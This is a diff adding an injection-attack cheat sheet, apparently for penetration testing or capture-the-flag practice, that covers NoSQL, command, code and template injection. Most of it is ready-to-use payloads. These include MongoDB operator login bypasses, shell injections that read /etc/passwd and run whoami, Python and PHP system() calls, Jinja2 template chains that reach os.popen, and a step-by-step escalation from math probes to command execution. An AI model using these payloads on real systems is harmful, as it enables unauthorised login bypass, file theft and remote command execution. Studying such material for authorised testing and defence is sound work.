@@ -1,0 +1,159 @@
+========================================
+INJECTION ATTACKS CHEATSHEET
+(NoSQL + Command + Code + SSTI)
+========================================
+
+[HOW TO IDENTIFY]
+- User input processed by backend
+- Errors / strange behavior
+- JSON input / system commands / templates
+
+========================================
+💉 NOSQL INJECTION
+========================================
+
+[WHERE]
+- JSON login forms
+- MongoDB-based apps
+
+[Basic Payloads]
+{"username":"admin","password":{"$ne":""}}
+{"username":{"$ne":null},"password":{"$ne":null}}
+
+[Bypass Login]
+{"username":"admin","password":{"$gt":""}}
+{"username":"admin","password":{"$ne":"wrong"}}
+
+[Operators]
+$ne → not equal
+$gt → greater than
+$lt → less than
+
+[URL Format]
+username[$ne]=admin&password[$ne]=123
+
+========================================
+💻 COMMAND INJECTION
+========================================
+
+[WHERE]
+- Input used in system commands (ping, ls, etc.)
+
+[Basic Payloads]
+; ls
+&& ls
+| ls
+
+[Read Files]
+; cat /etc/passwd
+&& cat /etc/passwd
+
+[System Info]
+; whoami
+; id
+
+[Windows]
+& dir
+& whoami
+
+[Bypass Filters]
+;ls
+&&ls
+|ls
+
+========================================
+🧠 CODE INJECTION
+========================================
+
+[WHERE]
+- Input executed as code (eval, exec)
+
+[Basic Payloads]
+1+1
+7*7
+
+[JS Context]
+'); alert(1); //
+
+[Python Context]
+__import__('os').system('ls')
+
+[PHP Context]
+system('ls');
+
+========================================
+🔥 SSTI (VERY IMPORTANT)
+========================================
+
+[HOW TO DETECT]
+Input: {{7*7}}
+→ Output: 49 → vulnerable
+
+[Basic Payloads]
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+
+[Template Engines]
+Jinja2: {{7*7}}
+Twig: {{7*7}}
+ERB: <%= 7*7 %>
+
+[Read Files]
+{{config.items()}}
+{{self.__init__.__globals__}}
+
+[Command Execution (Advanced)]
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{cycler.__init__.__globals__.os.popen('ls').read()}}
+
+========================================
+🧪 TEST FLOW
+========================================
+
+1. Try simple math:
+   {{7*7}} or 1+1
+2. If executed → injection confirmed
+3. Try system commands
+4. Try reading files
+
+========================================
+🔍 COMMON ENTRY POINTS
+========================================
+
+- Login forms (JSON)
+- Search fields
+- Ping / traceroute tools
+- Template-based pages
+
+========================================
+🔥 QUICK PAYLOAD SET
+========================================
+
+{"username":"admin","password":{"$ne":""}}
+; ls
+&& whoami
+1+1
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+
+========================================
+⚠️ COMMON MISTAKES
+========================================
+
+- Not testing JSON format
+- Forgetting spaces / symbols
+- Not trying math expressions
+- Ignoring error messages
+
+========================================
+RULES
+========================================
+
+- TRY SIMPLE FIRST (7*7, 1+1)
+- JSON → NOSQL
+- SYSTEM COMMAND → COMMAND INJECTION
+- {{ }} WORKS → SSTI
+
+========================================
